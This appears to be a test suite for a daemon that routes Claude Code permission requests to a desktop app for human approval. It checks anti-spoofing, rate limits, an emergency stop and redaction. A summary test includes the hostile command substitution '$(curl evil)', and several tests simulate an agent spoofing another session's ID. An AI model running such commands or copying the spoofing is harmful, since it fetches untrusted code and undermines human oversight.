// Stage 6: answering sessions. A real daemon on a socket + a real agenthub-hook (a process via #!),
// a fake system: a made-up signed Claude Code is the hook's ancestor, and the test process is "AgentHub.app".

import { test, before } from "node:test";
import assert from "node:assert/strict";
import { execFileSync, spawn } from "node:child_process";
import { request as httpRequest } from "node:http";
import { existsSync, readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { NATIVE_PATH } from "../lib/native.mjs";
import { REPO_DIR } from "../lib/config.mjs";
import { hookStateFor, requestRef, safeSummary, buildAnswers, sanitizeQuestions, stableStringify } from "../lib/hook/cards.mjs";
import { curl, req, startHub, waitFor } from "./helpers.mjs";
import { APP_REQ, asApp, childEnv, fakeClaude, HOOK_SCRIPT, runHook, sysDouble } from "./hook-helpers.mjs";

before(() => {
  if (!existsSync(NATIVE_PATH)) execFileSync(join(REPO_DIR, "scripts", "build-native.sh"), { stdio: "ignore" });
});

const SID = "11111111-1111-4111-8111-111111111111";
const SID2 = "22222222-2222-4222-8222-222222222222";
const NIGHT_SID = "33333333-3333-4333-8333-333333333333";
const CPID = 990001;
const CPID2 = 990002;
const NIGHT_PID = 990003;
const SECRET = "SECRET-MARKER-7f3a";

async function hub(hookCfg = {}) {
  const sys = sysDouble();
  asApp(sys);
  const h = await startHub({ sys, services: "hook", overrides: { requirements: { app: APP_REQ }, services: { hook: { sweepMs: 60_000, ...hookCfg } } } });
  h.sys = sys;
  h.st = () => hookStateFor(h.core.facts);
  h.hook = (body, claudePid = CPID, env) => runHook({ home: h.home, body, claudePid, sys, env });
  h.start = (sid = SID, claudePid = CPID) => h.hook({ session_id: sid, hook_event_name: "SessionStart", source: "startup", transcript_path: "/x/" + SECRET }, claudePid);
  h.respond = (args) => req(h.sock, "POST", "/actions/session.respond", { args });
  h.journal = () => readFileSync(h.config.paths.journal, "utf8");
  return h;
}

const bash = (sid = SID, command = `ls ${SECRET}`) => ({
  session_id: sid,
  hook_event_name: "PermissionRequest",
  transcript_path: "/Users/x/.claude/projects/p/" + SECRET + ".jsonl",
  cwd: "/Users/x/" + SECRET,
  permission_mode: "default",
  tool_name: "Bash",
  tool_input: { command, description: SECRET },
  permission_suggestions: [{ type: "addRules", rules: [{ toolName: "Bash", ruleContent: "ls" }], behavior: "allow", destination: "localSettings" }],
});

const QUESTIONS = [
  { question: "Какой фреймворк?", header: "Фреймворк", multiSelect: false, options: [{ label: "React", description: "a" }, { label: "Vue", description: "b" }] },
  { question: "Что включить?", header: "Опции", multiSelect: true, options: [{ label: "Тесты" }, { label: "Линтер" }, { label: "CI" }] },
];
const ask = (sid = SID) => ({ session_id: sid, hook_event_name: "PermissionRequest", tool_name: "AskUserQuestion", tool_input: { questions: QUESTIONS } });

const pendingCard = (h, n = 1) => waitFor(() => h.st().cards.size >= n && [...h.st().cards.values()][n - 1]);

test("unknown session (no SessionStart) with a process without a terminal → {} right away, no card", async () => {
  const h = await hub();
  try {
    // the session file is faked as interactive, but the process itself has no controlling terminal
    fakeClaude(h, h.sys, CPID, SID, { tty: false });
    const r = await h.hook(bash());
    assert.equal(r.code, 0);
    assert.deepEqual(r.json, {});
    assert.equal(h.st().cards.size, 0);
    assert.match(h.journal(), /"type":"hook-skip".*"reason":"not-interactive"/);
  } finally {
    await h.stop();
  }
});

test("a background claude -p (entrypoint sdk-cli) → SessionStart does not make it interactive, hook → {}", async () => {
  const h = await hub();
  try {
    fakeClaude(h, h.sys, NIGHT_PID, NIGHT_SID, { kind: "print", entrypoint: "sdk-cli" });
    assert.deepEqual((await h.start(NIGHT_SID, NIGHT_PID)).json, {});
    assert.equal(h.st().interactive.size, 0);
    const r = await h.hook(bash(NIGHT_SID), NIGHT_PID);
    assert.deepEqual(r.json, {});
    assert.equal(h.st().cards.size, 0);
    assert.match(h.journal(), /"type":"hook-session".*"interactive":false/);
  } finally {
    await h.stop();
  }
});

test("spoofed session_id (another session's) → 403 peer:session-mismatch, the hook prints {}", async () => {
  const h = await hub();
  try {
    fakeClaude(h, h.sys, CPID, SID);
    fakeClaude(h, h.sys, CPID2, SID2);
    await h.start(SID2, CPID2);
    assert.equal(h.st().interactive.has(SID2), true);
    // the hook of session CPID speaks on behalf of SID2
    const r = await h.hook(bash(SID2), CPID);
    assert.deepEqual(r.json, {});
    assert.equal(h.st().cards.size, 0);
    const j = h.journal();
    assert.match(j, /"type":"hook-denied".*"error":"peer:session-mismatch"/);
    assert.match(j, new RegExp(`"claudePid":${CPID}`));
    // and SessionStart with a foreign id does not register
    await h.hook({ session_id: SID2, hook_event_name: "SessionStart" }, CPID);
    assert.equal(h.st().interactive.get(SID2).pid, CPID2);
    // a hook without Claude among its ancestors is not a hook at all
    const orphan = await runHook({ home: h.home, body: bash(SID) });
    assert.deepEqual(orphan.json, {});
  } finally {
    await h.stop();
  }
});

test("full path: SessionStart → card → \"once\" from app → allow without updatedPermissions; journal without tool_input", async () => {
  const h = await hub();
  try {
    fakeClaude(h, h.sys, CPID, SID);
    await h.start();
    assert.equal(h.core.sessions.get(SID)?.interactive, true);
    const events = [];
    h.core.on("event", (e) => e.type.startsWith("hook.") && events.push(e));
    const pending = h.hook(bash());
    const card = await pendingCard(h);
    // the card is visible to the app; cli does not see it but sees metadata
    const cards = await req(h.sock, "GET", "/hook/cards");
    assert.equal(cards.status, 200);
    assert.equal(cards.body.cards[0].summary, "Bash: ls");
    assert.deepEqual(cards.body.cards[0].decisions, ["once", "deny"]);
    assert.equal((await curl(h.sock, "GET", "/hook/cards")).status, 403);
    // cli sees only counters: requestId is the answer key, known only to the app
    const stc = await curl(h.sock, "GET", "/hook/status");
    assert.equal(stc.status, 200);
    assert.equal(stc.body.pendingCount.total, 1);
    assert.equal(stc.body.pending, undefined);
    assert.equal(JSON.stringify(stc.body).includes(card.requestId), false);
    const sta = await req(h.sock, "GET", "/hook/status");
    assert.equal(sta.body.pending[0].requestId, card.requestId);
    // cli cannot answer
    const cli = await curl(h.sock, "POST", "/actions/session.respond", { args: { requestId: card.requestId, decision: "once" } });
    assert.equal(cli.status, 403);
    assert.equal(cli.body.error, "peer:cli");
    // app answers
    const ok = await h.respond({ requestId: card.requestId, decision: "once" });
    assert.equal(ok.status, 200, JSON.stringify(ok.body));
    assert.equal(ok.body.ok, true);
    const r = await pending;
    assert.deepEqual(r.json, { hookSpecificOutput: { hookEventName: "PermissionRequest", decision: { behavior: "allow" } } });
    // a repeat with the same request_id is dropped
    const again = await h.respond({ requestId: card.requestId, decision: "deny" });
    assert.equal(again.status, 409);
    assert.equal(again.body.error, "facts:not-pending");
    assert.deepEqual(events.map((e) => e.type), ["hook.card", "hook.card.removed"]);
    for (const e of events) assert.equal(JSON.stringify(e).includes(SECRET), false);
    const j = h.journal();
    assert.match(j, new RegExp(`"type":"hook-card".*"claudePid":${CPID}`));
    assert.match(j, /"type":"hook-answer".*"decision":"once"/);
    assert.equal(j.includes(card.requestId), false, "the journal (readable by cli) has only the requestId hash");
    assert.match(j, new RegExp(`"request":"${requestRef(card.requestId)}"`));
    assert.equal(j.includes(SECRET), false, "the journal has no tool_input or paths");
  } finally {
    await h.stop();
  }
});

// Review 2026-11-09 (high): the idle service tells a subagent request (the session is working) from a main-thread question.
test("hook.pending fact: subagent is true for a subagent request (agent_id), false without it", async () => {
  const h = await hub();
  try {
    fakeClaude(h, h.sys, CPID, SID);
    await h.start();
    const main = h.hook(bash());
    await pendingCard(h);
    const sub = h.hook({ ...bash(SID, "ls other"), agent_id: "agent-7" });
    await pendingCard(h, 2);
    const fact = h.core.facts.get("hook.pending");
    assert.deepEqual(fact.map((c) => [c.sessionId, c.subagent]), [[SID, false], [SID, true]]);
    assert.equal(h.core.facts.get("hook.pending", fact[1].requestId).subagent, true);
    for (const c of [...h.st().cards.values()]) await h.respond({ requestId: c.requestId, decision: "deny" });
    await Promise.all([main, sub]);
  } finally {
    await h.stop();
  }
});

test("\"deny\" → deny with text, no interrupt", async () => {
  const h = await hub();
  try {
    fakeClaude(h, h.sys, CPID, SID);
    await h.start();
    const pending = h.hook(bash());
    const card = await pendingCard(h);
    assert.equal((await h.respond({ requestId: card.requestId, decision: "deny" })).status, 200);
    const d = (await pending).json.hookSpecificOutput.decision;
    assert.equal(d.behavior, "deny");
    assert.equal(typeof d.message, "string");
    assert.equal(d.interrupt, undefined);
    // "answer" on a permission → 409
    const p2 = h.hook(bash(SID, "pwd"));
    const c2 = await pendingCard(h);
    assert.equal((await h.respond({ requestId: c2.requestId, decision: "answer", answers: "[[0]]" })).body.error, "facts:decision");
    assert.equal((await h.respond({ requestId: c2.requestId, decision: "once", answers: "[[0]]" })).body.error, "facts:answers");
    assert.equal((await h.respond({ requestId: c2.requestId, decision: "once" })).status, 200);
    await p2;
  } finally {
    await h.stop();
  }
});

test("AskUserQuestion: choosing options → allow + updatedInput with the original questions and answers", async () => {
  const h = await hub();
  try {
    fakeClaude(h, h.sys, CPID, SID);
    await h.start();
    const pending = h.hook(ask());
    const card = await pendingCard(h);
    const view = (await req(h.sock, "GET", `/hook/cards/${card.requestId}`)).body;
    assert.equal(view.kind, "question");
    assert.equal(view.questions[1].multiSelect, true);
    assert.deepEqual(view.decisions, ["answer", "deny"]);
    assert.equal((await h.respond({ requestId: card.requestId, decision: "once" })).body.error, "facts:decision");
    assert.equal((await h.respond({ requestId: card.requestId, decision: "answer", answers: "[[0,1],[0]]" })).body.error, "facts:answers");
    assert.equal((await h.respond({ requestId: card.requestId, decision: "answer", answers: "[[5],[0]]" })).body.error, "facts:answers");
    const ok = await h.respond({ requestId: card.requestId, decision: "answer", answers: JSON.stringify([[1], [0, 2]]) });
    assert.equal(ok.status, 200, JSON.stringify(ok.body));
    const d = (await pending).json.hookSpecificOutput.decision;
    assert.equal(d.behavior, "allow");
    assert.deepEqual(d.updatedInput.questions, QUESTIONS);
    assert.deepEqual(d.updatedInput.answers, { "Какой фреймворк?": "Vue", "Что включить?": "Тесты, CI" });
    assert.equal(d.updatedPermissions, undefined);
  } finally {
    await h.stop();
  }
});

test("AskUserQuestion: \"Other\" with custom text", () => {
  const a = buildAnswers(QUESTIONS, JSON.stringify(["Svelte", [1]]));
  assert.deepEqual(a.answers, { "Какой фреймворк?": "Svelte", "Что включить?": "Линтер" });
  assert.equal(buildAnswers(QUESTIONS, JSON.stringify(["", [1]])).error, "answers");
  assert.equal(buildAnswers(QUESTIONS, "[[0]]").error, "answers");
  assert.equal(buildAnswers(QUESTIONS, "не json").error, "answers");
  assert.equal(sanitizeQuestions([{ question: "x", options: [] }]), null);
  assert.equal(sanitizeQuestions("x"), null);
});

test("dedup: an identical repeat request removes the previous card ({} to the old hook), an answer by the old id → 409", async () => {
  const h = await hub();
  try {
    fakeClaude(h, h.sys, CPID, SID);
    await h.start();
    const first = h.hook(bash());
    const c1 = await pendingCard(h);
    const second = h.hook(bash());
    await waitFor(() => h.st().cards.size === 1 && !h.st().cards.has(c1.requestId));
    assert.deepEqual((await first).json, {});
    const c2 = [...h.st().cards.values()][0];
    assert.equal((await h.respond({ requestId: c1.requestId, decision: "once" })).body.error, "facts:not-pending");
    // another request from the same session gets a separate card
    const third = h.hook(bash(SID, "git status"));
    await waitFor(() => h.st().cards.size === 2);
    assert.equal((await h.respond({ requestId: c2.requestId, decision: "once" })).status, 200);
    assert.equal((await second).json.hookSpecificOutput.decision.behavior, "allow");
    // Stop removes the session's remaining cards
    await h.hook({ session_id: SID, hook_event_name: "Stop", stop_hook_active: false, last_assistant_message: SECRET });
    assert.deepEqual((await third).json, {});
    assert.equal(h.st().cards.size, 0);
    assert.match(h.journal(), /"type":"hook-cancel".*"reason":"superseded"/);
    assert.match(h.journal(), /"type":"hook-cancel".*"reason":"stop"/);
    assert.equal(h.journal().includes(SECRET), false);
  } finally {
    await h.stop();
  }
});

test("card timeout → {} and the card is removed", async () => {
  const h = await hub({ waitMs: 300 });
  try {
    fakeClaude(h, h.sys, CPID, SID);
    await h.start();
    const r = await h.hook(bash());
    assert.deepEqual(r.json, {});
    assert.ok(r.ms >= 250, `waited ${r.ms} ms`);
    assert.equal(h.st().cards.size, 0);
    assert.match(h.journal(), /"type":"hook-cancel".*"reason":"timeout"/);
  } finally {
    await h.stop();
  }
});

test("agenthub-hook's own timeout shorter than the daemon wait → {}", async () => {
  const h = await hub();
  try {
    fakeClaude(h, h.sys, CPID, SID);
    await h.start();
    const r = await h.hook(bash(), CPID, { AGENTHUB_HOOK_TIMEOUT_MS: "300" });
    assert.deepEqual(r.json, {});
    assert.equal(r.code, 0);
    assert.ok(r.ms < 5000);
  } finally {
    await h.stop();
  }
});

test("SessionEnd removes cards and interactivity; the next request → {}", async () => {
  const h = await hub();
  try {
    fakeClaude(h, h.sys, CPID, SID);
    await h.start();
    const p = h.hook(bash());
    await pendingCard(h);
    await h.hook({ session_id: SID, hook_event_name: "SessionEnd", reason: "prompt_input_exit" });
    assert.deepEqual((await p).json, {});
    assert.equal(h.st().interactive.has(SID), false);
    assert.equal(h.core.sessions.get(SID), null);
    assert.deepEqual((await h.hook(bash())).json, {});
    assert.equal(h.st().cards.size, 0);
  } finally {
    await h.stop();
  }
});

test("answer in the terminal: session status waiting → working removes the card", async () => {
  const h = await hub();
  try {
    fakeClaude(h, h.sys, CPID, SID);
    await h.start();
    const p = h.hook(bash());
    const c = await pendingCard(h);
    await h.core.sessions.register(SID, { pid: CPID, source: "plugin:claude-sessions", status: "waiting", waitingFor: "permission prompt" });
    assert.equal(h.st().cards.has(c.requestId), true);
    await h.core.sessions.register(SID, { pid: CPID, source: "plugin:claude-sessions", status: "busy" });
    assert.deepEqual((await p).json, {});
    assert.match(h.journal(), /"reason":"answered-elsewhere"/);
  } finally {
    await h.stop();
  }
});

test("hook connection drop (signal from the core) removes the card: hook-gone", async () => {
  const h = await hub();
  try {
    fakeClaude(h, h.sys, CPID, SID);
    await h.start();
    const ac = new AbortController();
    const p = h.st().onHook(bash(), { peer: { class: "hook", claudePid: CPID }, signal: ac.signal });
    await pendingCard(h);
    ac.abort();
    assert.deepEqual(await p, {});
    assert.equal(h.st().cards.size, 0);
    assert.match(h.journal(), /"reason":"hook-gone"/);
    // already dropped: no card is created
    const ac2 = new AbortController();
    ac2.abort();
    assert.deepEqual(await h.st().onHook(bash(), { peer: { class: "hook", claudePid: CPID }, signal: ac2.signal }), {});
    assert.equal(h.st().cards.size, 0);
  } finally {
    await h.stop();
  }
});

test("Claude process died → session not interactive, {}", async () => {
  const h = await hub();
  try {
    fakeClaude(h, h.sys, CPID, SID);
    await h.start();
    h.sys.procs.get(CPID).startSec = 2000; // pid reused by another process
    // the hook must still descend from a "live" Claude to pass the hook class, so check through the state
    assert.equal(await h.st().isInteractive(SID, CPID), false);
    assert.equal(h.st().interactive.has(SID), false);
  } finally {
    await h.stop();
  }
});

test("approval rate limit → pause, hook.paused, new requests → {}", async () => {
  const h = await hub({ maxApprovalsPerMinute: 2 });
  try {
    fakeClaude(h, h.sys, CPID, SID);
    await h.start();
    const paused = [];
    h.core.on("hook.paused", (e) => paused.push(e));
    for (let i = 0; i < 2; i++) {
      const p = h.hook(bash(SID, `echo ${i}`));
      const c = await pendingCard(h);
      assert.equal((await h.respond({ requestId: c.requestId, decision: "once" })).body.ok, true);
      await p;
    }
    const p3 = h.hook(bash(SID, "echo 3"));
    const c3 = await pendingCard(h);
    const r = await h.respond({ requestId: c3.requestId, decision: "once" });
    assert.equal(r.body.ok, false);
    assert.equal(r.body.result.error, "rate-limit");
    assert.deepEqual((await p3).json, {});
    assert.equal(paused.length, 1);
    assert.deepEqual((await h.hook(bash(SID, "echo 4"))).json, {});
    assert.equal((await curl(h.sock, "GET", "/hook/status")).body.paused, true);
    // and in /hook/cards, until when (the app clears the pause banner at that time, finding 33 of review 2026-11-05)
    const cardsView = (await req(h.sock, "GET", "/hook/cards")).body;
    assert.equal(cardsView.paused, true);
    assert.equal(cardsView.pausedUntil, paused[0].until);
  } finally {
    await h.stop();
  }
});

test("ESTOP: pending cards are removed, hook → {}, session.respond → 423", async () => {
  const h = await hub();
  try {
    fakeClaude(h, h.sys, CPID, SID);
    await h.start();
    const p = h.hook(bash());
    const c = await pendingCard(h);
    writeFileSync(h.config.paths.estop, "test\n");
    assert.equal((await h.respond({ requestId: c.requestId, decision: "once" })).status, 423);
    await waitFor(() => h.st().cards.size === 0, { timeoutMs: 8000 });
    assert.deepEqual((await p).json, {});
    assert.deepEqual((await h.hook(bash())).json, {});
  } finally {
    await h.stop();
  }
});

test("ExitPlanMode and an unknown question shape: no card, {}", async () => {
  const h = await hub();
  try {
    fakeClaude(h, h.sys, CPID, SID);
    await h.start();
    assert.deepEqual((await h.hook({ session_id: SID, hook_event_name: "PermissionRequest", tool_name: "ExitPlanMode", tool_input: { plan: SECRET } })).json, {});
    assert.deepEqual((await h.hook({ session_id: SID, hook_event_name: "PermissionRequest", tool_name: "AskUserQuestion", tool_input: { questions: "x" } })).json, {});
    assert.equal(h.st().cards.size, 0);
  } finally {
    await h.stop();
  }
});

test("without the hook service: session.respond → 409 facts:no-hook-service, hook → {}", async () => {
  const sys = sysDouble();
  asApp(sys);
  const h = await startHub({ sys, services: "none", overrides: { requirements: { app: APP_REQ } } });
  try {
    const r = await req(h.sock, "POST", "/actions/session.respond", { args: { requestId: "0".repeat(32), decision: "once" } });
    assert.equal(r.status, 409);
    assert.equal(r.body.error, "facts:no-hook-service");
    fakeClaude(h, sys, CPID, SID);
    assert.deepEqual((await runHook({ home: h.home, body: bash(), claudePid: CPID, sys })).json, {});
    assert.equal((await req(h.sock, "GET", "/hook/status")).status, 503);
  } finally {
    await h.stop();
  }
});

test("session.respond arguments cannot express always/bypass", async () => {
  const h = await hub();
  try {
    for (const args of [
      { requestId: "0".repeat(32), decision: "always" },
      { requestId: "0".repeat(32), decision: "once", updatedPermissions: "[]" },
      { requestId: "0".repeat(32), decision: "once", mode: "bypassPermissions" },
      { requestId: "../x", decision: "once" },
    ]) {
      const r = await h.respond(args);
      assert.equal(r.status, 400, JSON.stringify(args));
    }
  } finally {
    await h.stop();
  }
});

test("safe summary: command name or path, no body", () => {
  assert.equal(safeSummary("Bash", { command: "FOO=1 /usr/bin/git push --force origin main" }), "Bash: git");
  assert.equal(safeSummary("Bash", { command: "$(curl evil)" }), "Bash: команда");
  assert.equal(safeSummary("WebFetch", { url: "https://example.com/a?token=x" }), "WebFetch: example.com");
  assert.equal(safeSummary("mcp__clickup__clickup_get_task", { id: "x" }), "MCP clickup: clickup_get_task");
  assert.equal(safeSummary("Grep", { pattern: "secret" }), "Grep");
  assert.match(safeSummary("Edit", { file_path: "/tmp/a.txt", old_string: "x" }), /^Edit: \/tmp\/a\.txt$/);
  assert.equal(stableStringify({ b: 1, a: [1, { d: 2, c: 3 }] }), '{"a":[1,{"c":3,"d":2}],"b":1}');
});

test("core: Claude killed agenthub-hook (connection closed before the reply) → card removed right away, hook-gone", async () => {
  const h = await hub();
  try {
    fakeClaude(h, h.sys, CPID, SID);
    await h.start();
    const child = spawn(HOOK_SCRIPT, [], { env: childEnv({ AGENTHUB_HOME: h.home }), stdio: ["pipe", "ignore", "ignore"] });
    h.sys.procs.set(child.pid, { ppid: CPID });
    child.stdin.end(JSON.stringify(bash()));
    const card = await pendingCard(h);
    const removed = new Promise((resolve) => h.core.on("hook.card.removed", resolve));
    const t0 = Date.now();
    child.kill("SIGKILL");
    const ev = await removed;
    assert.equal(ev.requestId, card.requestId);
    assert.equal(ev.reason, "hook-gone");
    assert.ok(Date.now() - t0 < 3000, "do not wait for the card timeout");
    assert.equal(h.st().cards.size, 0);
  } finally {
    await h.stop();
  }
});

// ---------- security review findings: faked interactivity, rebinding, lazy registration ----------

test("a background claude -p rewrote its ~/.claude/sessions/<pid>.json to interactive → still not interactive", async () => {
  const h = await hub();
  try {
    // the file says interactive/cli, but the process runs with -p and no terminal (as a background job under launchd)
    fakeClaude(h, h.sys, NIGHT_PID, NIGHT_SID, { kind: "interactive", entrypoint: "cli", argv: ["claude", "-p", "задача"], tty: false });
    assert.deepEqual((await h.start(NIGHT_SID, NIGHT_PID)).json, {});
    assert.equal(h.st().interactive.size, 0);
    assert.match(h.journal(), /"type":"hook-session".*"reason":"proc:no-tty"/);
    // with a terminal but with --print: also not
    fakeClaude(h, h.sys, NIGHT_PID, NIGHT_SID, { kind: "interactive", entrypoint: "cli", argv: ["claude", "--print", "--output-format", "json"], tty: true });
    assert.deepEqual((await h.start(NIGHT_SID, NIGHT_PID)).json, {});
    assert.equal(h.st().interactive.size, 0);
    assert.match(h.journal(), /"reason":"proc:print"/);
    // and PermissionRequest (lazy registration) gives {} without a card
    assert.deepEqual((await h.hook(bash(NIGHT_SID), NIGHT_PID)).json, {});
    assert.equal(h.st().cards.size, 0);
  } finally {
    await h.stop();
  }
});

test("session A's agent wrote live session B's session_id into its file: B does not move, SessionEnd(B) from A does not remove B", async () => {
  const h = await hub();
  try {
    fakeClaude(h, h.sys, CPID2, SID2);
    await h.start(SID2, CPID2);
    assert.equal(h.st().interactive.get(SID2).pid, CPID2);
    fakeClaude(h, h.sys, CPID, SID2); // process A's file now names B
    assert.deepEqual((await h.start(SID2, CPID)).json, {});
    assert.equal(h.st().interactive.get(SID2).pid, CPID2, "B stayed on its own pid");
    assert.equal(h.core.sessions.get(SID2).pid, CPID2);
    assert.match(h.journal(), /"type":"hook-session".*"reason":"sid-bound"/);
    await h.hook({ session_id: SID2, hook_event_name: "SessionEnd", reason: "other" }, CPID);
    assert.equal(h.st().interactive.has(SID2), true, "a foreign SessionEnd does not remove B");
    assert.match(h.journal(), /"type":"hook-foreign-session"/);
    // A's requests on behalf of B create no cards
    assert.deepEqual((await h.hook(bash(SID2), CPID)).json, {});
    assert.equal(h.st().cards.size, 0);
    // the real B works
    const pending = h.hook(bash(SID2), CPID2);
    const card = await pendingCard(h);
    assert.equal(card.claudePid, CPID2);
    assert.equal((await h.respond({ requestId: card.requestId, decision: "deny" })).status, 200);
    await pending;
  } finally {
    await h.stop();
  }
});

test("session_id change for the same pid only with source clear/resume/compact", async () => {
  const h = await hub();
  try {
    fakeClaude(h, h.sys, CPID, SID);
    await h.start(SID, CPID);
    fakeClaude(h, h.sys, CPID, SID2);
    await h.hook({ session_id: SID2, hook_event_name: "SessionStart", source: "startup" }, CPID);
    assert.equal(h.st().interactive.has(SID2), false);
    assert.equal(h.st().interactive.has(SID), true);
    assert.match(h.journal(), /"reason":"rebind-source"/);
    await h.hook({ session_id: SID2, hook_event_name: "SessionStart", source: "clear" }, CPID);
    assert.equal(h.st().interactive.has(SID2), true);
    assert.equal(h.st().interactive.has(SID), false, "/clear: the previous id of the same process is removed");
  } finally {
    await h.stop();
  }
});

test("after a daemon restart: without SessionStart an interactive session registers lazily on its first request", async () => {
  const h = await hub();
  try {
    fakeClaude(h, h.sys, CPID, SID);
    assert.equal(h.st().interactive.size, 0, "the registry is empty, there was no SessionStart");
    const pending = h.hook(bash());
    const card = await pendingCard(h);
    assert.equal(card.sessionId, SID);
    assert.equal(h.st().interactive.get(SID).pid, CPID);
    assert.match(h.journal(), /"type":"hook-session".*"interactive":true.*"source":"lazy"|"source":"lazy".*"type":"hook-session".*"interactive":true/);
    assert.equal((await h.respond({ requestId: card.requestId, decision: "once" })).status, 200);
    assert.equal((await pending).json.hookSpecificOutput.decision.behavior, "allow");
  } finally {
    await h.stop();
  }
});

test("SSE: only app receives hook.* events (with requestId), cli does not", async () => {
  const h = await hub();
  try {
    fakeClaude(h, h.sys, CPID, SID);
    await h.start();
    const cliEvents = await sseCollect(h.sock, { app: false });
    const appEvents = await sseCollect(h.sock, { app: true });
    const pending = h.hook(bash());
    const card = await pendingCard(h);
    await waitFor(() => appEvents.text.includes("hook.card"));
    assert.equal((await h.respond({ requestId: card.requestId, decision: "deny" })).status, 200);
    await pending;
    await waitFor(() => appEvents.text.includes("hook.card.removed"));
    await new Promise((r) => setTimeout(r, 100));
    assert.equal(cliEvents.text.includes("hook.card"), false);
    assert.equal(cliEvents.text.includes(card.requestId), false);
    assert.ok(cliEvents.text.includes("event: snapshot"), "the cli stream is alive");
    cliEvents.close();
    appEvents.close();
  } finally {
    await h.stop();
  }
});

// Subscribe to /events. app=true means from the "app" (the test process is marked FAKE_APP), otherwise curl (cli).
function sseCollect(sock, { app }) {
  return new Promise((resolve, reject) => {
    const out = { text: "", close: () => {} };
    if (app) {
      const r = httpRequest({ socketPath: sock, path: "/events", headers: { host: "hub" } }, (res) => {
        res.setEncoding("utf8");
        res.on("data", (c) => (out.text += c));
        resolve(out);
      });
      r.on("error", reject);
      r.end();
      out.close = () => r.destroy();
      return;
    }
    const child = spawn("/usr/bin/curl", ["-sN", "--unix-socket", sock, "http://hub/events"], { stdio: ["ignore", "pipe", "ignore"] });
    child.stdout.setEncoding("utf8");
    child.stdout.on("data", (c) => (out.text += c));
    out.close = () => child.kill();
    setTimeout(() => resolve(out), 300);
  });
}
